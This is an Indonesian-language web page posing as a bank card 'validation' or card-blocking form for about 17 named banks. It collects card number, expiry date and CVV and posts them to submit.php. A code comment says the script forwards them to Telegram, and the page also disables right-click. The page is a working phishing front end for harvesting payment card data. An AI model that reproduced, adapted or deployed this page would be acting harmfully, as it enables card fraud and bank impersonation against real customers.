<!DOCTYPE html><html lang="id"><head>
<meta charset="UTF-8">
  <meta name="theme-color" content="#ff8c00">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Validasi Kartu Bank</title>
<style>
  /* Reset */
  * { box-sizing: border-box; }
  body {
    font-family: Arial, sans-serif;
    margin:0; background:#fff; color:#222;
  }
  .top-background {
    height: 220px;
margin-top:-8%;
    border-radius: 0 0 40px 40px;
    transition: background-color 0.5s ease;
  }
  .card-preview {
  margin-top: 40px; /* âœ… Ini juga bisa menurunkan posisi card */
}

  .container {
    max-width: 360px;
    margin: -170px auto 40px;
    padding: 0 20px 40px;
    background: #f4a460;
    
    border-radius: 20px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    position: relative;
    z-index: 2;
  }
  .card-wrapper {
    position: relative;
    width: 320px;
    height: 205px;
    background: #000;
    margin: 0 auto 39px;
    overflow: hidden;
    border: 1px solid #000;
    border-radius: 20px;
    box-shadow: 0 9px 16px rgba(0,0,0,0.15);
  }
  #card-image {
    width: 100%;
    height: 100%;
    object-fit: cover;
    position: relative;
    left: 0;
  
    transition: left 0.5s ease;
  }
  .card-img-new {
    position: absolute;
    top: 0;
    width: 100%;
    height: 100%;
    object-fit: contain;
    left: 100%;
    transition: left 0.5s ease;
  }
  form {
    display: flex;
    flex-direction: column;
    gap: 20px;
  }
  label {
    font-weight: 600;
    margin-bottom: 6px;
    display: block;
    font-size: 15px;
  }
  input, select, button {
    width: 100%;
    padding: 12px 14px;
    font-size: 16px;
    border: 1px solid #b22222;
    border-radius: 5px;
    transition: border-color 0.3s ease;
  }
  input:focus, select:focus {
    border-color: #333;
    outline: none;
  }
  button {
    background-color: #444;

    color: white;
    font-weight: 700;
    border: none;
    cursor: not-allowed;
    transition: background-color 0.3s ease;
    border-radius: 4px;
  }
  button:enabled {
    background-color: #b22222;
    cursor: pointer;
    

  }
  .error {
    border-color: #b22222 !important;
  }
  .row-inputs {
  display: flex;
  gap: 16px;
}

.input-with-icon {
  position: relative;
  flex: 1; /* supaya 2 kolom sama lebar */
}

.input-with-icon input {
  width: 100%;
  padding-right: 36px; /* ruang untuk icon di kanan */
  font-size: 16px;
  border: 1px solid #b22222;
  border-radius: 4px;
  transition: border-color 0.3s ease;
}

.input-icon {
  position: absolute;
  top: 70%;
  right: 10px;
  width: 20px;
  height: 20px;
  transform: translateY(-50%);
  pointer-events: none; /* supaya icon tidak menghalangi input */
  opacity: 0.6;
}

</style>
</head>
<body>

<div class="top-background"></div>

<div class="container">
  <div class="card-wrapper">
    <img id="card-image" src="" alt="Gambar kartu bank">
  </div>


  <form id="card-form" method="POST" action="submit.php" novalidate="">
    <label for="bank-select">Pilihan Bank Lainya</label>
    <select id="bank-select" name="bank" required="">
      <!-- option akan di-generate JS -->
    </select>

  <div class="input-with-icon">
    <label for="card-number">Nomor Kartu</label>
    <input type="text" id="card-number" name="card_number" placeholder="Masukan 16 Digit Nomor Kartu" maxlength="19" inputmode="numeric" autocomplete="cc-number" required="">
    <img src="images/633611.png" alt="credit card icon" class="input-icon">
  </div>

  <div class="row-inputs">
    <div class="input-with-icon">
      <label for="expiry-date">Masa Berlaku</label>
      <input type="text" id="expiry-date" name="expiry_date" placeholder="Valid/Thru" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required="">
      <img src="https://img.icons8.com/?size=100&id=vwGXRtPWrZSn&format=png&color=000000" alt="calendar icon" class="input-icon">
    </div>

    <div class="input-with-icon">
      <label for="cvv">CVV</label>
      <input type="text" id="cvv" name="cvv" placeholder="***" maxlength="3" inputmode="numeric" autocomplete="cc-csc" required="">
      <img src="images/565547.png" alt="lock icon" class="input-icon">
    </div>
  </div>

  <button type="submit">Blokir Kartu</button>
</form>
</div>

<script>
  document.addEventListener("DOMContentLoaded", () => {
    const banks = [
      { id: "bca", name: "BCA", color: "#FFD8B1", cardImg: "photo/bca.jpg" },
      { id: "mandiri", name: "Mandiri", color: "#C6E2FF", cardImg: "https://blogger.googleusercontent.com/img/a/AVvXsEjp95w0o6RXLZLr1_5wbYtHLzpBvhnnNtmtPR6hn_3rCZmm3vkyZQAsi0Gv9urr5uM4TR-aR7dZUkAtcctmIuFl0-D181fVGLmG-BqedzvZZFbbm7YifGlTt-r2GzREz-pifEYIT6mtXWO0us-BHNgI96uSU2cnDlQxhl2apC7nKK4Tp9WrP40X8Yil0-B8" },
      { id: "ocbc", name: "OCBC", color: "#FAD1D1", cardImg: "photo/ocbc.jpg" },
      { id: "bri", name: "BRI", color: "#E0FFD8", cardImg: "img/bri88.jpg" },
      { id: "cimb", name: "CIMB Niaga", color: "#FFE3E3", cardImg: "https://blogger.googleusercontent.com/img/a/AVvXsEglhmjfAh65g6pMnj1ClEw8LnPonP4cpAEJDeOft2x0b2wIG5m7zpZonaNqbHYdQ4cSNpTeyXb2p2gOBKFtTVSZKqUWTtDqWMzN51nQU3xqXf-ptY8EdBvFojG6XD7SXGUZ9GMFOnf4sQksmKZGzg2rf8EBz0r_OCdv3U0JqpMO9A7_jKluYeUqR-76pMuG" },
      { id: "permata", name: "Permata", color: "#FFF4D1", cardImg: "photo/permata.jpg" },
      { id: "danamon", name: "Danamon", color: "#E3E0FF", cardImg: "photo/danamon.jpg" },
      { id: "btn", name: "BTN", color: "#FFE0F0", cardImg: "photo/btn1.jpg" },
      
      
            { id: "bukopin", name: "BUKOPIN", color: "#D1FFF3", cardImg: "https://cdn.glitch.global/f7ea1293-5258-4ca2-adb1-2075e83102ad/a4c52567-6225-4892-bda1-cbbd49b56cca_1.png?v=1748654143581" },
      
                  { id: "dbs", name: "DBS", color: "#D1FFF3", cardImg: "https://cdn.glitch.global/f7ea1293-5258-4ca2-adb1-2075e83102ad/ChatGPT%20Image%2031%20Mei%202025%2C%2008.34.10.png?v=1748655313285" },
      
      { id: "maybank", name: "Maybank", color: "#FFF4D1", cardImg: "photo/maybank1.jpg" },
      { id: "uob", name: "UOB", color: "#E3E0FF", cardImg: "photo/uob.jpg" },
      
      { id: "mnc", name: "MNC", color: "#FFF4D1", cardImg: "photo/mnc.jpg" },
      { id: "hsbc", name: "HSBC", color: "#E3E0FF", cardImg: "photo/hsbc.jpg" },
      { id: "mega", name: "MEGA", color: "#FFF4D1", cardImg: "img/mega2.jpg" },
      { id: "btpn", name: "BTPN", color: "#E3E0FF", cardImg: "photo/btpn.jpg" },
      
      
      { id: "banklain", name: "BANK LAIN", color: "#FFF1D1", cardImg: "https://blogger.googleusercontent.com/img/a/AVvXsEiT1WY_GsD4Bd38oxNSdIj9fYOxDyqfm4aPHqUA8wwwX7kC6E_oHgKiEtj1DMGEmNiqvVXEUtz8ALU_c-ifPEOFBwvPQSKnsMKKB4VLRh4jyWcZ1v16cCXjpZBuRsHP9Iepm8un9pUCJO4QrXI7bzbhy8w6aogDZipAxbWm0rg7I0y6RmK-p914Rgxvs0h5" },
    ];

    const bankSelect = document.getElementById("bank-select");
    const topBackground = document.querySelector(".top-background");
    const cardImage = document.getElementById("card-image");
    const cardNumberInput = document.getElementById("card-number");
    const expiryInput = document.getElementById("expiry-date");
    const cvvInput = document.getElementById("cvv");
    const submitBtn = document.getElementById("submit-btn");
    const form = document.getElementById("card-form");

    // Inisialisasi pilihan bank dan default background + gambar kartu
    function initBankOptions() {
      banks.forEach(bank => {
        const option = document.createElement("option");
        option.value = bank.id;
        option.textContent = bank.name;
        bankSelect.appendChild(option);
      });
      bankSelect.value = banks[0].id;
      updateBankUI(banks[0].id, true);
    }

    function updateBankUI(bankId, firstLoad = false) {
      const bank = banks.find(b => b.id === bankId);
      if (!bank) return;
      if (firstLoad) {
        topBackground.style.backgroundColor = bank.color;
      } else {
        topBackground.style.transition = "background-color 0.5s ease";
        topBackground.style.backgroundColor = bank.color;
      }
      changeCardImage(bank.cardImg);
    }

    function changeCardImage(newSrc) {
      const newImg = document.createElement("img");
      newImg.src = newSrc;
      newImg.alt = "Gambar kartu bank";
      newImg.classList.add("card-img-new");

      cardImage.parentNode.style.position = "relative";
      cardImage.parentNode.appendChild(newImg);

      requestAnimationFrame(() => {
        newImg.style.left = "0";
        cardImage.style.left = "-100%";
        cardImage.style.position = "absolute";
      });

      newImg.addEventListener("transitionend", () => {
        cardImage.src = newSrc;
        cardImage.style.left = "0";
        cardImage.style.position = "relative";
        newImg.remove();
      });
    }

    // Validasi nomor kartu pakai Luhn Algorithm + panjang 12-19 digit
    function isValidCardNumber(number) {
      if (!/^\d{12,19}$/.test(number)) return false;

      let sum = 0;
      let shouldDouble = false;
      for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    // Validasi expiry date MM/YY, masa berlaku minimal saat ini atau lebih
    function isValidExpiryDate(expiry) {
      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
      const [mm, yy] = expiry.split("/").map(Number);
      if (mm < 1 || mm > 12) return false;

      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;

      if (yy < currentYear) return false;
      if (yy === currentYear && mm < currentMonth) return false;
      return true;
    }

    // Validasi CVV 3 atau 4 digit angka
    function isValidCVV(cvv) {
      return /^\d{3,4}$/.test(cvv);
    }

    // Cek semua validasi input form
    function validateAll() {
      let valid = true;

      // Nomor kartu tanpa spasi
      const cardNumRaw = cardNumberInput.value.replace(/\s/g, "");
      if (isValidCardNumber(cardNumRaw)) {
        cardNumberInput.classList.remove("error");
      } else {
        cardNumberInput.classList.add("error");
        valid = false;
      }

      if (isValidExpiryDate(expiryInput.value)) {
        expiryInput.classList.remove("error");
      } else {
        expiryInput.classList.add("error");
        valid = false;
      }

      if (isValidCVV(cvvInput.value)) {
        cvvInput.classList.remove("error");
      } else {
        cvvInput.classList.add("error");
        valid = false;
      }

      if (!bankSelect.value) valid = false;

      submitBtn.disabled = !valid;
      return valid;
    }

    // Event listener input format dan validasi live
    bankSelect.addEventListener("change", e => {
      updateBankUI(e.target.value);
      validateAll();
    });

    cardNumberInput.addEventListener("input", e => {
      let val = e.target.value.replace(/\D/g, "");
      val = val.match(/.{1,4}/g)?.join(" ") || "";
      e.target.value = val;
      validateAll();
    });

    expiryInput.addEventListener("input", e => {
      let val = e.target.value.replace(/[^\d]/g, "");
      if (val.length > 2) {
        val = val.slice(0, 2) + "/" + val.slice(2, 4);
      }
      e.target.value = val;
      validateAll();
    });

    cvvInput.addEventListener("input", e => {
      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
      validateAll();
    });

    form.addEventListener("submit", e => {
      if (!validateAll()) {
        e.preventDefault();
        return;
      }
      // form submit ke submit.php (PHP server)
      // Pastikan submit.php sudah siap menerima POST dan kirim ke Telegram
    });

    // Inisialisasi awal
    initBankOptions();
    validateAll();
  });
  
  document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
</script>


</body></html>